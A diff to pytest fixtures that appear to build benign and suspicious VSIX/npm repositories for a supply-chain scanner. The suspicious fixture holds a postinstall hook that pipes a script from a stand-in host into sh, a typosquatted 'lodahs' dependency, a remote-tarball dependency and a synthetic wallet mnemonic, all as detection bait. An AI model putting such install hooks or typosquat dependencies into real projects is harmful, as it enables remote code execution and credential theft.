@@ -1,12 +1,15 @@
 from __future__ import annotations
 
 import io
+import base64
 import json
 import zipfile
 from pathlib import Path
 from typing import Mapping
 
 import pytest
+
+VALID_SHA512 = "sha512-" + base64.b64encode(bytes(64)).decode("ascii")
 
 
 def build_vsix(files: Mapping[str, bytes | str]) -> bytes:
@@ -98,7 +101,25 @@ def benign_repository(tmp_path: Path) -> Path:
         build_vsix(
             {
                 "benign-repository/package.json": package,
-                "benign-repository/package-lock.json": json.dumps({"lockfileVersion": 3}),
+                "benign-repository/package-lock.json": json.dumps(
+                    {
+                        "name": "benign-repository",
+                        "version": "1.0.0",
+                        "lockfileVersion": 3,
+                        "packages": {
+                            "": {
+                                "name": "benign-repository",
+                                "version": "1.0.0",
+                                "dependencies": {"kleur": "4.1.5"},
+                            },
+                            "node_modules/kleur": {
+                                "version": "4.1.5",
+                                "resolved": "https://registry.npmjs.org/kleur/-/kleur-4.1.5.tgz",
+                                "integrity": f"{VALID_SHA512} sha1-Zm9v",
+                            },
+                        },
+                    }
+                ),
                 "benign-repository/src/index.js": "export const greet = (name) => `hello ${name}`;\n",
                 "benign-repository/.github/workflows/test.yml": (
                     "name: test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
@@ -121,6 +142,11 @@ def suspicious_repository(tmp_path: Path) -> Path:
             "scripts": {
                 "postinstall": "curl https://example.invalid/install.sh | sh",
                 "test": "node scripts/bootstrap.js",
+            },
+            "dependencies": {
+                "elliptic": "6.5.3",
+                "lodahs": "4.17.21",
+                "remote-tool": "https://example.invalid/remote-tool.tgz",
             },
         },
         indent=2,
@@ -155,7 +181,40 @@ jobs:
         build_vsix(
             {
                 "repo/package.json": package,
-                "repo/package-lock.json": json.dumps({"lockfileVersion": 3}),
+                "repo/package-lock.json": json.dumps(
+                    {
+                        "name": "synthetic-crypto-stealer-patterns",
+                        "version": "0.0.0",
+                        "lockfileVersion": 3,
+                        "packages": {
+                            "": {
+                                "name": "synthetic-crypto-stealer-patterns",
+                                "version": "0.0.0",
+                                "dependencies": {
+                                    "elliptic": "6.5.3",
+                                    "lodahs": "4.17.21",
+                                    "remote-tool": "https://example.invalid/remote-tool.tgz",
+                                },
+                            },
+                            "node_modules/elliptic": {
+                                "version": "6.5.3",
+                                "resolved": "https://registry.npmjs.org/elliptic/-/elliptic-6.5.3.tgz",
+                                "integrity": VALID_SHA512,
+                            },
+                            "node_modules/lodahs": {
+                                "version": "4.17.21",
+                                "resolved": "https://registry.npmjs.org/lodahs/-/lodahs-4.17.21.tgz",
+                                "hasInstallScript": True,
+                            },
+                            "node_modules/remote-tool": {
+                                "version": "1.0.0",
+                                "resolved": "https://example.invalid/remote-tool-1.0.0.tgz",
+                                "integrity": VALID_SHA512,
+                            },
+                        },
+                    },
+                    indent=2,
+                ),
                 "repo/scripts/bootstrap.js": source,
                 "repo/config/example.js": (
                     "const mnemonic = 'synthetic alpha beta gamma delta epsilon zeta eta theta iota kappa lambda';\n"
